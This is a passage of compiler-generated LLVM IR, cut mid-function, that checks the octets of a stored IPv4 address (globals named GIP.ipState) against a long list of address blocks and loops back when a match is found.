  br i1 %or.cond691, label %.critedge.backedge, label %77

; <label>:77:                                     ; preds = %72
  %78 = icmp eq i8 %19, -53
  %79 = icmp eq i8 %21, 59
  %or.cond280 = and i1 %78, %79
  br i1 %or.cond280, label %.critedge.backedge, label %80

; <label>:80:                                     ; preds = %77
  %81 = icmp eq i8 %19, -52
  %82 = icmp eq i8 %21, 34
  %or.cond282 = and i1 %81, %82
  br i1 %or.cond282, label %.critedge.backedge, label %83

; <label>:83:                                     ; preds = %80
  %84 = icmp eq i8 %19, -49
  %85 = icmp eq i8 %21, 30
  %or.cond284 = and i1 %84, %85
  br i1 %or.cond284, label %.critedge.backedge, label %86

; <label>:86:                                     ; preds = %83
  %87 = icmp eq i8 %19, 117
  %.off = add i8 %21, -55
  %88 = icmp ult i8 %.off, 2
  %or.cond692 = and i1 %87, %88
  br i1 %or.cond692, label %.critedge.backedge, label %89

; <label>:89:                                     ; preds = %86
  %90 = icmp eq i8 %19, 80
  %91 = icmp eq i8 %21, -21
  %or.cond290 = and i1 %90, %91
  %92 = icmp eq i8 %21, 120
  %or.cond292 = and i1 %84, %92
  %or.cond693 = or i1 %or.cond290, %or.cond292
  br i1 %or.cond693, label %.critedge.backedge, label %93

; <label>:93:                                     ; preds = %89
  %94 = icmp eq i8 %19, -47
  %95 = icmp eq i8 %21, 35
  %or.cond294 = and i1 %94, %95
  br i1 %or.cond294, label %.critedge.backedge, label %96

; <label>:96:                                     ; preds = %93
  %97 = icmp eq i8 %19, 64
  %98 = icmp eq i8 %21, 70
  %or.cond296 = and i1 %97, %98
  br i1 %or.cond296, label %.critedge.backedge, label %99

; <label>:99:                                     ; preds = %96
  %100 = icmp eq i8 %19, -84
  %101 = and i8 %21, -16
  %102 = icmp eq i8 %101, 16
  %or.cond = and i1 %100, %102
  br i1 %or.cond, label %.critedge.backedge, label %103

; <label>:103:                                    ; preds = %99
  %104 = load i8, i8* @GIP.ipState.0, align 1
  %105 = icmp eq i8 %104, 100
  br i1 %105, label %106, label %109

; <label>:106:                                    ; preds = %103
  %107 = load i8, i8* @GIP.ipState.1, align 1
  %.off810 = add i8 %107, -64
  %108 = icmp ult i8 %.off810, 63
  br i1 %108, label %.critedge.backedge, label %thread-pre-split

thread-pre-split:                                 ; preds = %106
  %.pr = load i8, i8* @GIP.ipState.0, align 1
  br label %109

; <label>:109:                                    ; preds = %thread-pre-split, %103
  %110 = phi i8 [ %.pr, %thread-pre-split ], [ %104, %103 ]
  %111 = icmp eq i8 %110, -87
  %112 = load i8, i8* @GIP.ipState.1, align 1
  %113 = icmp eq i8 %112, -2
  %or.cond300 = and i1 %111, %113
  br i1 %or.cond300, label %.critedge.backedge, label %114

; <label>:114:                                    ; preds = %109
  %115 = icmp eq i8 %110, -58
  %116 = and i8 %112, -2
  %117 = icmp eq i8 %116, 18
  %or.cond814 = and i1 %115, %117
  br i1 %or.cond814, label %.critedge.backedge, label %118

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* @GIP.ipState.0, align 1
  %120 = icmp eq i8 %119, 64
  br i1 %120, label %121, label %124

; <label>:121:                                    ; preds = %118
  %122 = load i8, i8* @GIP.ipState.1, align 1
  %.off808 = add i8 %122, -69
  %123 = icmp ult i8 %.off808, -98
  br i1 %123, label %.critedge.backedge, label %thread-pre-split600

thread-pre-split600:                              ; preds = %121
  %.pr601 = load i8, i8* @GIP.ipState.0, align 1
  br label %124

; <label>:124:                                    ; preds = %thread-pre-split600, %118
  %125 = phi i8 [ %.pr601, %thread-pre-split600 ], [ %119, %118 ]
  %126 = icmp eq i8 %125, -128
  br i1 %126, label %127, label %130

; <label>:127:                                    ; preds = %124
  %128 = load i8, i8* @GIP.ipState.1, align 1
  %.off807 = add i8 %128, -35
  %129 = icmp ult i8 %.off807, -54
  br i1 %129, label %.critedge.backedge, label %130

; <label>:130:                                    ; preds = %127, %124
  %131 = load i8, i8* @GIP.ipState.0, align 1
  %132 = icmp eq i8 %131, -127
  br i1 %132, label %133, label %137

; <label>:133:                                    ; preds = %130
  %134 = load i8, i8* @GIP.ipState.1, align 1
  %135 = icmp ult i8 %134, 22
  %136 = icmp eq i8 %134, -1
  %or.cond304 = or i1 %135, %136
  br i1 %or.cond304, label %thread-pre-split602, label %.critedge.backedge

thread-pre-split602:                              ; preds = %133
  %.pr603 = load i8, i8* @GIP.ipState.0, align 1
  br label %137

; <label>:137:                                    ; preds = %thread-pre-split602, %130
  %138 = phi i8 [ %.pr603, %thread-pre-split602 ], [ %131, %130 ]
  %139 = icmp eq i8 %138, -126
  br i1 %139, label %140, label %143

; <label>:140:                                    ; preds = %137
  %141 = load i8, i8* @GIP.ipState.1, align 1
  %.off806 = add i8 %141, -40
  %142 = icmp sgt i8 %.off806, -1
  br i1 %142, label %.critedge.backedge, label %143

; <label>:143:                                    ; preds = %140, %137
  %144 = load i8, i8* @GIP.ipState.0, align 1
  %145 = icmp eq i8 %144, -125
  br i1 %145, label %146, label %148

; <label>:146:                                    ; preds = %143
  %147 = load i8, i8* @GIP.ipState.1, align 1
  switch i8 %147, label %.critedge.backedge [
    i8 -1, label %thread-pre-split604
    i8 -2, label %thread-pre-split604
    i8 -3, label %thread-pre-split604
    i8 -4, label %thread-pre-split604
    i8 -5, label %thread-pre-split604
    i8 2, label %thread-pre-split604
    i8 1, label %thread-pre-split604
    i8 0, label %thread-pre-split604
  ]

thread-pre-split604:                              ; preds = %146, %146, %146, %146, %146, %146, %146, %146
  %.pr605 = load i8, i8* @GIP.ipState.0, align 1
  br label %148

; <label>:148:                                    ; preds = %thread-pre-split604, %143
  %149 = phi i8 [ %.pr605, %thread-pre-split604 ], [ %144, %143 ]
  %150 = icmp eq i8 %149, -124
  br i1 %150, label %151, label %153

; <label>:151:                                    ; preds = %148
  %152 = load i8, i8* @GIP.ipState.1, align 1
  switch i8 %152, label %.critedge.backedge [
    i8 -1, label %153
    i8 -2, label %153
    i8 -3, label %153
    i8 -4, label %153
    i8 -5, label %153
    i8 2, label %153
    i8 1, label %153
    i8 0, label %153
  ]

; <label>:153:                                    ; preds = %151, %151, %151, %151, %151, %151, %151, %151, %148
  %154 = load i8, i8* @GIP.ipState.0, align 1
  %155 = icmp eq i8 %154, -122
  br i1 %155, label %156, label %159

; <label>:156:                                    ; preds = %153
  %157 = load i8, i8* @GIP.ipState.1, align 1
  %.off805 = add i8 %157, -5
  %158 = icmp ult i8 %.off805, -26
  br i1 %158, label %.critedge.backedge, label %thread-pre-split606

thread-pre-split606:                              ; preds = %156
  %.pr607 = load i8, i8* @GIP.ipState.0, align 1
  br label %159

; <label>:159:                                    ; preds = %thread-pre-split606, %153
  %160 = phi i8 [ %.pr607, %thread-pre-split606 ], [ %154, %153 ]
  %161 = icmp eq i8 %160, -120
  br i1 %161, label %162, label %165

; <label>:162:                                    ; preds = %159
  %163 = load i8, i8* @GIP.ipState.1, align 1
  %.off804 = add i8 %163, 79
  %164 = icmp ult i8 %.off804, 46
  br i1 %164, label %.critedge.backedge, label %165

; <label>:165:                                    ; preds = %162, %159
  %166 = load i8, i8* @GIP.ipState.0, align 1
  %167 = icmp eq i8 %166, -118
  br i1 %167, label %168, label %171

; <label>:168:                                    ; preds = %165
  %169 = load i8, i8* @GIP.ipState.1, align 1
  %.off803 = add i8 %169, -13
  %170 = icmp ult i8 %.off803, -75
  br i1 %170, label %.critedge.backedge, label %thread-pre-split608

thread-pre-split608:                              ; preds = %168
  %.pr609 = load i8, i8* @GIP.ipState.0, align 1
  br label %171

; <label>:171:                                    ; preds = %thread-pre-split608, %165
  %172 = phi i8 [ %.pr609, %thread-pre-split608 ], [ %166, %165 ]
  %173 = icmp eq i8 %172, -117
  br i1 %173, label %174, label %177

; <label>:174:                                    ; preds = %171
  %175 = load i8, i8* @GIP.ipState.1, align 1
  %.off802 = add i8 %175, -31
  %176 = icmp ult i8 %.off802, 112
  br i1 %176, label %.critedge.backedge, label %177

; <label>:177:                                    ; preds = %174, %171
  %178 = load i8, i8* @GIP.ipState.0, align 1
  %179 = icmp eq i8 %178, -116
  br i1 %179, label %180, label %183

; <label>:180:                                    ; preds = %177
  %181 = load i8, i8* @GIP.ipState.1, align 1
  %.off801 = add i8 %181, -1
  %182 = icmp ult i8 %.off801, -54
  br i1 %182, label %.critedge.backedge, label %thread-pre-split610

thread-pre-split610:                              ; preds = %180
  %.pr611 = load i8, i8* @GIP.ipState.0, align 1
  br label %183

; <label>:183:                                    ; preds = %thread-pre-split610, %177
  %184 = phi i8 [ %.pr611, %thread-pre-split610 ], [ %178, %177 ]
  %185 = icmp eq i8 %184, -113
  br i1 %185, label %186, label %189

; <label>:186:                                    ; preds = %183
  %187 = load i8, i8* @GIP.ipState.1, align 1
  %.off800 = add i8 %187, -45
  %188 = icmp ult i8 %.off800, -68
  br i1 %188, label %.critedge.backedge, label %189

; <label>:189:                                    ; preds = %186, %183
  %190 = load i8, i8* @GIP.ipState.0, align 1
  %191 = icmp eq i8 %190, -112
  br i1 %191, label %192, label %195

; <label>:192:                                    ; preds = %189
  %193 = load i8, i8* @GIP.ipState.1, align 1
  %.off799 = add i8 %193, -99
  %194 = icmp ult i8 %.off799, -102
  br i1 %194, label %.critedge.backedge, label %thread-pre-split612

thread-pre-split612:                              ; preds = %192
  %.pr613 = load i8, i8* @GIP.ipState.0, align 1
  br label %195

; <label>:195:                                    ; preds = %thread-pre-split612, %189
  %196 = phi i8 [ %.pr613, %thread-pre-split612 ], [ %190, %189 ]
  %197 = icmp eq i8 %196, -110
  %198 = load i8, i8* @GIP.ipState.1, align 1
  %199 = icmp eq i8 %198, -91
  %or.cond816 = and i1 %197, %199
  br i1 %or.cond816, label %.critedge.backedge, label %200

; <label>:200:                                    ; preds = %195
  %201 = load i8, i8* @GIP.ipState.0, align 1
  %202 = icmp eq i8 %201, -109
  br i1 %202, label %203, label %.thread621.thread

; <label>:203:                                    ; preds = %200
  %204 = load i8, i8* @GIP.ipState.1, align 1
  %.off795 = add i8 %204, -35
  %205 = icmp ult i8 %.off795, 8
  br i1 %205, label %.critedge.backedge, label %206

; <label>:206:                                    ; preds = %203
  %.pr615 = load i8, i8* @GIP.ipState.0, align 1
  %207 = icmp eq i8 %.pr615, -109
  br i1 %207, label %208, label %thread-pre-split625

; <label>:208:                                    ; preds = %206
  %209 = load i8, i8* @GIP.ipState.1, align 1
  %.off796 = add i8 %209, -103
  %210 = icmp ult i8 %.off796, 2
  br i1 %210, label %.critedge.backedge, label %.thread

.thread:                                          ; preds = %208
  %.pr617.pr = load i8, i8* @GIP.ipState.0, align 1
  %211 = icmp eq i8 %.pr617.pr, -109
  br i1 %211, label %212, label %.thread621.thread

; <label>:212:                                    ; preds = %.thread
  %213 = load i8, i8* @GIP.ipState.1, align 1
  %214 = and i8 %213, -2
  %215 = icmp eq i8 %214, -88
  br i1 %215, label %.critedge.backedge, label %.thread618

.thread618:                                       ; preds = %212
  %.pr620.pr = load i8, i8* @GIP.ipState.0, align 1
  %216 = icmp eq i8 %.pr620.pr, -109
  br i1 %216, label %217, label %thread-pre-split625

; <label>:217:                                    ; preds = %.thread618
  %218 = load i8, i8* @GIP.ipState.1, align 1
  %219 = and i8 %218, -2
  %220 = icmp eq i8 %219, -58
  br i1 %220, label %.critedge.backedge, label %.thread621

.thread621:                                       ; preds = %217
  %.pr623.pr.pr = load i8, i8* @GIP.ipState.0, align 1
  %221 = icmp eq i8 %.pr623.pr.pr, -109
  br i1 %221, label %222, label %.thread621.thread

; <label>:222:                                    ; preds = %.thread621
  %223 = load i8, i8* @GIP.ipState.1, align 1
  %224 = icmp ult i8 %223, -18
  %225 = icmp eq i8 %223, -1
  %or.cond320 = or i1 %224, %225
  br i1 %or.cond320, label %thread-pre-split625, label %.critedge.backedge

thread-pre-split625:                              ; preds = %206, %.thread618, %222
  %.pr626 = load i8, i8* @GIP.ipState.0, align 1
  br label %.thread621.thread

.thread621.thread:                                ; preds = %200, %.thread, %thread-pre-split625, %.thread621
  %226 = phi i8 [ %.pr626, %thread-pre-split625 ], [ %.pr623.pr.pr, %.thread621 ], [ %.pr617.pr, %.thread ], [ %201, %200 ]
  %227 = icmp eq i8 %226, -106
  br i1 %227, label %228, label %231

; <label>:228:                                    ; preds = %.thread621.thread
  %229 = load i8, i8* @GIP.ipState.1, align 1
  %.off794 = add i8 %229, -113
  %230 = icmp ult i8 %.off794, 2
  br i1 %230, label %.critedge.backedge, label %231

; <label>:231:                                    ; preds = %228, %.thread621.thread
  %232 = load i8, i8* @GIP.ipState.0, align 1
  %233 = icmp eq i8 %232, -104
  br i1 %233, label %234, label %237

; <label>:234:                                    ; preds = %231
  %235 = load i8, i8* @GIP.ipState.1, align 1
  %.off793 = add i8 %235, 105
  %236 = icmp ult i8 %.off793, 4
  br i1 %236, label %.critedge.backedge, label %thread-pre-split627

thread-pre-split627:                              ; preds = %234
  %.pr628 = load i8, i8* @GIP.ipState.0, align 1
  br label %237

; <label>:237:                                    ; preds = %thread-pre-split627, %231
  %238 = phi i8 [ %.pr628, %thread-pre-split627 ], [ %232, %231 ]
  %239 = icmp eq i8 %238, -103
  br i1 %239, label %240, label %243

; <label>:240:                                    ; preds = %237
  %241 = load i8, i8* @GIP.ipState.1, align 1
  %.off792 = add i8 %241, -21
  %242 = icmp ult i8 %.off792, 11
  br i1 %242, label %.critedge.backedge, label %243

; <label>:243:                                    ; preds = %240, %237
  %244 = load i8, i8* @GIP.ipState.0, align 1
  %245 = icmp eq i8 %244, -101
  br i1 %245, label %246, label %.thread631.thread

; <label>:246:                                    ; preds = %243
  %247 = load i8, i8* @GIP.ipState.1, align 1
  %.off789 = add i8 %247, -5
  %248 = icmp ult i8 %.off789, 5
  br i1 %248, label %.critedge.backedge, label %249

; <label>:249:                                    ; preds = %246
  %.pr630 = load i8, i8* @GIP.ipState.0, align 1
  %250 = icmp eq i8 %.pr630, -101
  br i1 %250, label %251, label %thread-pre-split635

; <label>:251:                                    ; preds = %249
  %252 = load i8, i8* @GIP.ipState.1, align 1
  %.off790 = add i8 %252, -74
  %253 = icmp ult i8 %.off790, 15
  br i1 %253, label %.critedge.backedge, label %.thread631

.thread631:                                       ; preds = %251
  %.pr633.pr = load i8, i8* @GIP.ipState.0, align 1
  %254 = icmp eq i8 %.pr633.pr, -101
  br i1 %254, label %255, label %.thread631.thread

; <label>:255:                                    ; preds = %.thread631
  %256 = load i8, i8* @GIP.ipState.1, align 1
  %.off791 = add i8 %256, 43
  %257 = icmp ult i8 %.off791, 9
  br i1 %257, label %.critedge.backedge, label %thread-pre-split635

thread-pre-split635:                              ; preds = %249, %255
  %.pr636 = load i8, i8* @GIP.ipState.0, align 1
  br label %.thread631.thread

.thread631.thread:                                ; preds = %243, %thread-pre-split635, %.thread631
  %258 = phi i8 [ %.pr636, %thread-pre-split635 ], [ %.pr633.pr, %.thread631 ], [ %244, %243 ]
  %259 = icmp eq i8 %258, -99
  br i1 %259, label %260, label %263

; <label>:260:                                    ; preds = %.thread631.thread
  %261 = load i8, i8* @GIP.ipState.1, align 1
  %.off788 = add i8 %261, 106
  %262 = icmp ult i8 %.off788, 4
  br i1 %262, label %.critedge.backedge, label %263

; <label>:263:                                    ; preds = %260, %.thread631.thread
  %264 = load i8, i8* @GIP.ipState.0, align 1
  %265 = icmp eq i8 %264, -98
  br i1 %265, label %266, label %thread-pre-split640

; <label>:266:                                    ; preds = %263
  %267 = load i8, i8* @GIP.ipState.1, align 1
  %.off786 = add i8 %267, -1
  %268 = icmp ult i8 %.off786, 20
  br i1 %268, label %.critedge.backedge, label %269

; <label>:269:                                    ; preds = %266
  %.pr638 = load i8, i8* @GIP.ipState.0, align 1
  %270 = icmp eq i8 %.pr638, -98
  br i1 %270, label %271, label %274

; <label>:271:                                    ; preds = %269
  %272 = load i8, i8* @GIP.ipState.1, align 1
  %.off787 = add i8 %272, 21
  %273 = icmp ult i8 %.off787, 12
  br i1 %273, label %.critedge.backedge, label %thread-pre-split640

thread-pre-split640:                              ; preds = %263, %271
  %.pr641 = load i8, i8* @GIP.ipState.0, align 1
  br label %274

; <label>:274:                                    ; preds = %thread-pre-split640, %269
  %275 = phi i8 [ %.pr641, %thread-pre-split640 ], [ %.pr638, %269 ]
  %276 = icmp eq i8 %275, -97
  %277 = load i8, i8* @GIP.ipState.1, align 1
  %278 = icmp eq i8 %277, 120
  %or.cond818 = and i1 %276, %278
  br i1 %or.cond818, label %.critedge.backedge, label %279

; <label>:279:                                    ; preds = %274
  %280 = load i8, i8* @GIP.ipState.0, align 1
  %281 = icmp eq i8 %280, -96
  br i1 %281, label %282, label %285

; <label>:282:                                    ; preds = %279
  %283 = load i8, i8* @GIP.ipState.1, align 1
  %.off785 = add i8 %283, 124
  %284 = icmp ult i8 %.off785, 19
  br i1 %284, label %.critedge.backedge, label %thread-pre-split642

thread-pre-split642:                              ; preds = %282
  %.pr643 = load i8, i8* @GIP.ipState.0, align 1
  br label %285

; <label>:285:                                    ; preds = %thread-pre-split642, %279
  %286 = phi i8 [ %.pr643, %thread-pre-split642 ], [ %280, %279 ]
  %287 = icmp eq i8 %286, 64
  br i1 %287, label %288, label %291

; <label>:288:                                    ; preds = %285
  %289 = load i8, i8* @GIP.ipState.1, align 1
  %.off784 = add i8 %289, 32
  %290 = icmp ult i8 %.off784, 3
  br i1 %290, label %.critedge.backedge, label %291

; <label>:291:                                    ; preds = %288, %285
  %292 = load i8, i8* @GIP.ipState.0, align 1
  %293 = icmp eq i8 %292, -94
  br i1 %293, label %294, label %297

; <label>:294:                                    ; preds = %291
  %295 = load i8, i8* @GIP.ipState.1, align 1
  %.off783 = add i8 %295, -45
  %296 = icmp ult i8 %.off783, 2
  br i1 %296, label %.critedge.backedge, label %thread-pre-split644

thread-pre-split644:                              ; preds = %294
  %.pr645 = load i8, i8* @GIP.ipState.0, align 1
  br label %297

; <label>:297:                                    ; preds = %thread-pre-split644, %291
  %298 = phi i8 [ %.pr645, %thread-pre-split644 ], [ %292, %291 ]
  %299 = icmp eq i8 %298, -93
  br i1 %299, label %300, label %303

; <label>:300:                                    ; preds = %297
  %301 = load i8, i8* @GIP.ipState.1, align 1
  %.off782 = add i8 %301, 51
  %302 = icmp ult i8 %.off782, 2
  br i1 %302, label %.critedge.backedge, label %303

; <label>:303:                                    ; preds = %300, %297
  %304 = load i8, i8* @GIP.ipState.0, align 1
  %305 = icmp eq i8 %304, -92
  br i1 %305, label %306, label %thread-pre-split649

; <label>:306:                                    ; preds = %303
  %307 = load i8, i8* @GIP.ipState.1, align 1
  %.off780 = add i8 %307, -45
  %308 = icmp ult i8 %.off780, 5
  br i1 %308, label %.critedge.backedge, label %309

; <label>:309:                                    ; preds = %306
  %.pr647 = load i8, i8* @GIP.ipState.0, align 1
  %310 = icmp eq i8 %.pr647, -92
  br i1 %310, label %311, label %314

; <label>:311:                                    ; preds = %309
  %312 = load i8, i8* @GIP.ipState.1, align 1
  %.off781 = add i8 %312, 39
  %313 = icmp ult i8 %.off781, 16
  br i1 %313, label %.critedge.backedge, label %thread-pre-split649

thread-pre-split649:                              ; preds = %303, %311
  %.pr650 = load i8, i8* @GIP.ipState.0, align 1
  br label %314

; <label>:314:                                    ; preds = %thread-pre-split649, %309
  %315 = phi i8 [ %.pr650, %thread-pre-split649 ], [ %.pr647, %309 ]
  %316 = icmp eq i8 %315, -87
  br i1 %316, label %317, label %321

; <label>:317:                                    ; preds = %314
  %318 = load i8, i8* @GIP.ipState.1, align 1
  %319 = and i8 %318, -2
  %320 = icmp eq i8 %319, -4
  br i1 %320, label %.critedge.backedge, label %321

; <label>:321:                                    ; preds = %317, %314
  %322 = load i8, i8* @GIP.ipState.0, align 1
  %323 = icmp eq i8 %322, -57
  br i1 %323, label %324, label %327

; <label>:324:                                    ; preds = %321
  %325 = load i8, i8* @GIP.ipState.1, align 1
  %.off778 = add i8 %325, -121
  %326 = icmp ult i8 %.off778, -123
  br i1 %326, label %.critedge.backedge, label %thread-pre-split651

thread-pre-split651:                              ; preds = %324
  %.pr652 = load i8, i8* @GIP.ipState.0, align 1
  br label %327

; <label>:327:                                    ; preds = %thread-pre-split651, %321
  %328 = phi i8 [ %.pr652, %thread-pre-split651 ], [ %322, %321 ]
  %329 = icmp eq i8 %328, -51
  br i1 %329, label %330, label %333

; <label>:330:                                    ; preds = %327
  %331 = load i8, i8* @GIP.ipState.1, align 1
  %.off777 = add i8 %331, -1
  %332 = icmp ult i8 %.off777, 117
  br i1 %332, label %.critedge.backedge, label %333

; <label>:333:                                    ; preds = %330, %327
  %334 = load i8, i8* @GIP.ipState.0, align 1
  %335 = icmp eq i8 %334, -49
  br i1 %335, label %336, label %340

; <label>:336:                                    ; preds = %333
  %337 = load i8, i8* @GIP.ipState.1, align 1
  %338 = and i8 %337, -2
  %339 = icmp eq i8 %338, 60
  br i1 %339, label %.critedge.backedge, label %thread-pre-split653

thread-pre-split653:                              ; preds = %336
  %.pr654 = load i8, i8* @GIP.ipState.0, align 1
  br label %340

; <label>:340:                                    ; preds = %thread-pre-split653, %333
  %341 = phi i8 [ %.pr654, %thread-pre-split653 ], [ %334, %333 ]
  %342 = icmp eq i8 %341, 104
  br i1 %342, label %343, label %346

; <label>:343:                                    ; preds = %340
  %344 = load i8, i8* @GIP.ipState.1, align 1
  %.off775 = add i8 %344, -16
  %345 = icmp ult i8 %.off775, 15
  br i1 %345, label %.critedge.backedge, label %346

; <label>:346:                                    ; preds = %343, %340
  %347 = load i8, i8* @GIP.ipState.0, align 1
  %348 = icmp eq i8 %347, -68
  %349 = load i8, i8* @GIP.ipState.1, align 1
  %350 = icmp eq i8 %349, -90
  %351 = icmp eq i8 %349, -30
  %or.cond345720 = or i1 %350, %351
  %or.cond694 = and i1 %348, %or.cond345720
  br i1 %or.cond694, label %.critedge.backedge, label %352

; <label>:352:                                    ; preds = %346
  %353 = icmp eq i8 %347, -97
  %354 = icmp eq i8 %349, -53
  %or.cond347 = and i1 %353, %354
  br i1 %or.cond347, label %.critedge.backedge, label %355

; <label>:355:                                    ; preds = %352
  %356 = icmp eq i8 %347, -94
  %357 = icmp eq i8 %349, -13
  %or.cond349 = and i1 %356, %357
  br i1 %or.cond349, label %.critedge.backedge, label %358

; <label>:358:                                    ; preds = %355
  %359 = icmp eq i8 %347, 45
  %360 = icmp eq i8 %349, 55
  %or.cond351 = and i1 %359, %360
  br i1 %or.cond351, label %.critedge.backedge, label %361

; <label>:361:                                    ; preds = %358
  %362 = icmp eq i8 %347, -78
  %363 = icmp eq i8 %349, 62
  %or.cond353 = and i1 %362, %363
  br i1 %or.cond353, label %.critedge.backedge, label %364

; <label>:364:                                    ; preds = %361
  %365 = icmp eq i8 %347, 104
  %366 = icmp eq i8 %349, -125
  %367 = icmp eq i8 %349, -20
  %or.cond357721 = or i1 %366, %367
  %or.cond695 = and i1 %365, %or.cond357721
  br i1 %or.cond695, label %.critedge.backedge, label %368

; <label>:368:                                    ; preds = %364
  %369 = icmp eq i8 %347, 107
  %370 = icmp eq i8 %349, -86
  %or.cond359 = and i1 %369, %370
  br i1 %or.cond359, label %.critedge.backedge, label %371

; <label>:371:                                    ; preds = %368
  %372 = icmp eq i8 %347, -118
  %373 = icmp eq i8 %349, -59
  %374 = icmp eq i8 %349, 68
  %or.cond363722 = or i1 %373, %374
  %or.cond696 = and i1 %372, %or.cond363722
  br i1 %or.cond696, label %.critedge.backedge, label %375

; <label>:375:                                    ; preds = %371
  %376 = icmp eq i8 %347, -117
  %377 = icmp eq i8 %349, 59
  %or.cond365 = and i1 %376, %377
  br i1 %or.cond365, label %.critedge.backedge, label %378

; <label>:378:                                    ; preds = %375
  %379 = icmp eq i8 %347, -110
  %380 = icmp eq i8 %349, -71
  %or.cond367 = and i1 %379, %380
  br i1 %or.cond367, label %381, label %385

; <label>:381:                                    ; preds = %378
  %382 = load i8, i8* @GIP.ipState.2, align 1
  %383 = icmp slt i8 %382, 0
  %384 = icmp ult i8 %382, -65
  %or.cond368 = and i1 %383, %384
  br i1 %or.cond368, label %.critedge.backedge, label %385

; <label>:385:                                    ; preds = %381, %378
  %386 = load i8, i8* @GIP.ipState.0, align 1
  %387 = icmp eq i8 %386, -93
  %388 = load i8, i8* @GIP.ipState.1, align 1
  %389 = icmp eq i8 %388, 47
  %or.cond370 = and i1 %387, %389
  %390 = load i8, i8* @GIP.ipState.2, align 1
  %391 = icmp eq i8 %390, 10
  %or.cond820 = and i1 %or.cond370, %391
  br i1 %or.cond820, label %.critedge.backedge, label %392

; <label>:392:                                    ; preds = %385
  %393 = load i8, i8* @GIP.ipState.0, align 1
  %394 = icmp eq i8 %393, -82
  %395 = load i8, i8* @GIP.ipState.1, align 1
  %396 = icmp eq i8 %395, -118
  %or.cond373 = and i1 %394, %396
  br i1 %or.cond373, label %397, label %400

; <label>:397:                                    ; preds = %392
  %398 = load i8, i8* @GIP.ipState.2, align 1
  %.off774 = add i8 %398, -1
  %399 = icmp ult i8 %.off774, 126
  br i1 %399, label %.critedge.backedge, label %400

; <label>:400:                                    ; preds = %397, %392
  %401 = load i8, i8* @GIP.ipState.0, align 1
  %402 = load i8, i8* @GIP.ipState.1, align 1
  %notlhs = icmp ne i8 %401, -64
  %notrhs = icmp ne i8 %402, -15
  %or.cond376.not = or i1 %notrhs, %notlhs
  %403 = load i8, i8* @GIP.ipState.2, align 1
  %404 = icmp sgt i8 %403, -2
  %or.cond822 = or i1 %or.cond376.not, %404
  br i1 %or.cond822, label %405, label %.critedge.backedge

; <label>:405:                                    ; preds = %400
  %406 = load i8, i8* @GIP.ipState.0, align 1
  %407 = icmp eq i8 %406, -58
  %408 = load i8, i8* @GIP.ipState.1, align 1
  %409 = icmp eq i8 %408, -57
  %or.cond379 = and i1 %407, %409
  br i1 %or.cond379, label %410, label %413

; <label>:410:                                    ; preds = %405
  %411 = load i8, i8* @GIP.ipState.2, align 1
  %.off773 = add i8 %411, -64
  %412 = icmp ult i8 %.off773, 63
  br i1 %412, label %.critedge.backedge, label %413

; <label>:413:                                    ; preds = %410, %405
  %414 = load i8, i8* @GIP.ipState.0, align 1
  %415 = icmp eq i8 %414, -58
  %416 = load i8, i8* @GIP.ipState.1, align 1
  %417 = icmp eq i8 %416, -45
  %or.cond382 = and i1 %415, %417
  br i1 %or.cond382, label %418, label %421

; <label>:418:                                    ; preds = %413
  %419 = load i8, i8* @GIP.ipState.2, align 1
  %.off772 = add i8 %419, -96
  %420 = icmp ult i8 %.off772, 31
  br i1 %420, label %.critedge.backedge, label %421

; <label>:421:                                    ; preds = %418, %413
  %422 = load i8, i8* @GIP.ipState.0, align 1
  %423 = icmp eq i8 %422, -49
  %424 = load i8, i8* @GIP.ipState.1, align 1
  %425 = icmp eq i8 %424, -102
  %or.cond385 = and i1 %423, %425
  br i1 %or.cond385, label %426, label %430

; <label>:426:                                    ; preds = %421
  %427 = load i8, i8* @GIP.ipState.2, align 1
  %428 = icmp ult i8 %427, -64
  %429 = icmp eq i8 %427, -1
  %or.cond386 = or i1 %428, %429
  br i1 %or.cond386, label %430, label %.critedge.backedge

; <label>:430:                                    ; preds = %426, %421
  %431 = load i8, i8* @GIP.ipState.0, align 1
  %432 = icmp eq i8 %431, 37
  %433 = load i8, i8* @GIP.ipState.1, align 1
  %434 = icmp eq i8 %433, -117
  %or.cond388 = and i1 %432, %434
  br i1 %or.cond388, label %435, label %438

; <label>:435:                                    ; preds = %430
  %436 = load i8, i8* @GIP.ipState.2, align 1
  %.off771 = add i8 %436, -1
  %437 = icmp ult i8 %.off771, 30
  br i1 %437, label %.critedge.backedge, label %438

; <label>:438:                                    ; preds = %435, %430
  %439 = load i8, i8* @GIP.ipState.0, align 1
  %440 = icmp eq i8 %439, 67
  %441 = load i8, i8* @GIP.ipState.1, align 1
  %442 = icmp eq i8 %441, -49
  %or.cond391 = and i1 %440, %442
  br i1 %or.cond391, label %443, label %446

; <label>:443:                                    ; preds = %438
  %444 = load i8, i8* @GIP.ipState.2, align 1
  %.off770 = add i8 %444, -64
  %445 = icmp ult i8 %.off770, 31
  br i1 %445, label %.critedge.backedge, label %446

; <label>:446:                                    ; preds = %443, %438
  %447 = load i8, i8* @GIP.ipState.0, align 1
  %448 = icmp eq i8 %447, 67
  %449 = load i8, i8* @GIP.ipState.1, align 1
  %450 = icmp eq i8 %449, -51
  %or.cond394 = and i1 %448, %450
  br i1 %or.cond394, label %451, label %455

; <label>:451:                                    ; preds = %446
  %452 = load i8, i8* @GIP.ipState.2, align 1
  %453 = icmp slt i8 %452, 0
  %454 = icmp ult i8 %452, -65
  %or.cond395 = and i1 %453, %454
  br i1 %or.cond395, label %.critedge.backedge, label %455

; <label>:455:                                    ; preds = %451, %446
  %456 = load i8, i8* @GIP.ipState.0, align 1
  %457 = icmp eq i8 %456, 80
  %458 = load i8, i8* @GIP.ipState.1, align 1
  %459 = icmp eq i8 %458, -16
  %or.cond397 = and i1 %457, %459
  br i1 %or.cond397, label %460, label %464

; <label>:460:                                    ; preds = %455
  %461 = load i8, i8* @GIP.ipState.2, align 1
  %462 = icmp slt i8 %461, 0
  %463 = icmp ult i8 %461, -113
  %or.cond398 = and i1 %462, %463
  br i1 %or.cond398, label %.critedge.backedge, label %464

; <label>:464:                                    ; preds = %460, %455
  %465 = load i8, i8* @GIP.ipState.0, align 1
  %466 = icmp eq i8 %465, 82
  %467 = load i8, i8* @GIP.ipState.1, align 1
  %468 = icmp eq i8 %467, -60
  %or.cond400 = and i1 %466, %468
  br i1 %or.cond400, label %469, label %472

; <label>:469:                                    ; preds = %464
  %470 = load i8, i8* @GIP.ipState.2, align 1
  %.off769 = add i8 %470, -1
  %471 = icmp ult i8 %.off769, 14
  br i1 %471, label %.critedge.backedge, label %472

; <label>:472:                                    ; preds = %469, %464
